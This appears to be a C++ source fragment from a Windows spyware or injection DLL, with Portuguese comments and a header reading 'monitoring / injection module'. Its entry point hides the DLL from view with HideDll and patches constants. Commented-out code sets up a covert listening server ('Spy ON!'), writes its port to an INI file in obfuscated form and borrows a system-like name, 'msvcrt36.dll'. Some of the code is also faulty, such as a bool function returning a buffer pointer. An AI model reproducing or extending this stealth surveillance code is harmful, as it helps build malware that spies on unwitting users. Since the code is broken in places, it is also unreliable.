/* *********************************************
 *                                             *
 *  Modulo de monitoramento / injeção          *
 *                                             *
 ********************************************** */

#include <windows.h>
#include "debugUtils.h"
#include "baseCentral.h"
#include "CMStrUtils.h"
#include "secret.h"

#pragma argsused
#define DLL_EXPORT __declspec(dllexport)

//Servidor *servidor;

bool GravaPorta(int porta) {
	__try {
		char *buf = (char*)malloc(MAX_PATH);
		CM_StrCat(DLLPathAnterior, "configs.ini", buf);
		TCMIniFile *ini = new TCMIniFile(buf);
		ini->WriteInteger("configs", "ces", porta * 9269 + 37);
		free(ini);
		return buf;
	} __except (1) {
	}
}

bool MyExtractFilePath(char* valor, char *buffer) {
	if (strlen(valor) == 0)
		return false;

	int i = 0;
	for (i = (strlen(valor) - 2); i > 0; i--) {
		if (char(valor[i]) == 92) {
			// buffer = (char *)malloc(i+2);
			memcpy(buffer, valor, i + 1);
			buffer[i + 1] = 0;
			return true;
		}
	}
	memcpy(buffer, valor, i + 1);
	return true;
}

void getDiretorioAnterior(char *origem, char**destino) {
	int indice = 0;
	if (origem && strlen(origem) > 3) {
		for (int i = (strlen(origem) - 2); i > 0; i--) {
			if (origem[i] == '\\') {
				int len = i + 1;
				if (destino) {
					*destino = (char*)malloc(len + 1);
					memset(*destino, 0, len + 1);
					memcpy(*destino, origem, len);
					return;
				}
			}
		}
	}
}

extern "C" DLL_EXPORT void* __stdcall f1(char* lpDiretorioBase) {
	if (lpDiretorioBase)
		diretorioBase = strdup(lpDiretorioBase);
	cliente = new Cliente((PROC)processarCliente);
	cliente->inicializar();
	inicializarDLL();
	HideDll(hInstanceDll);
	//ShowDll(hInstanceDll);
	return(void*) & processar;
}

//char* nomeMatrizDLL = "msvcrt36.dll";

int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved) {
	switch(reason) {
	case DLL_PROCESS_ATTACH: {
			DisableThreadLibraryCalls(hinst);
			hInstanceDll = hinst;
			// moduloDLL = GetModuleHandleA(0);

			//
			// Inicializa funcao de debug
			//fOutputDebugStringA = (hOutputDebugStringA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OutputDebugStringA");
			// if (!fOutputDebugStringA)
			// MessageBox(0, "Erro no output!", "Bad Boy", 0);

			// debugar("Iniciando spy...");

			DLLPath1 = (char*)malloc(MAX_PATH);
			DLLPath = (char*)malloc(MAX_PATH);
			GetModuleFileNameA(hinst, &DLLPath1[0], MAX_PATH);
			MyExtractFilePath(DLLPath1, DLLPath);
			free(DLLPath1);
			// getDiretorioAnterior(DLLPath, &DLLPathAnterior);
			// debugar("Path anterior: %s", DLLPathAnterior);

			// NomeMatriz = new char[CM_StrLen(DLLPath)+15];
			// CM_StrCat(DLLPath, nomeMatrizDLL, NomeMatriz);
			// mutacao(nomeMatrizDLL);
			// WSAStartup(0x101, &dataWSA);
			patchConstantes();

			/* servidor = new Servidor((PROC)processar);
			servidor->onClientDisconnect = (PROC)OnClientDisconnect;

			//
			// Procura uma porta livre para conexão do servidor
			for (int i = 1313, j = 0; i < 30999; i++) {
			// debugar("conectando servidor em %d", i);
			if (servidor->conectar(i)) {
			debugar("Spy ON! Aguardando conexoes na porta %d...",i);
			break;
			}
			// Falha ao conectar na porta
			//debugar("Erro 9722. Nº %d", i);
			if (i == 30999) {
			return 0;
			}
			}

			GravaPorta(servidor->getPorta()); */
			//HideDll(hinst);
			inicializado = true;
			return 1;

		}break;
	case DLL_PROCESS_DETACH: {
			// debugar("descarregando...");
			//delete servidor;
			debugar("Monitor descarregado!");
		}break;

	default:
		break;
	}
	return true;
}
// ---------------------------------------------------------------------------
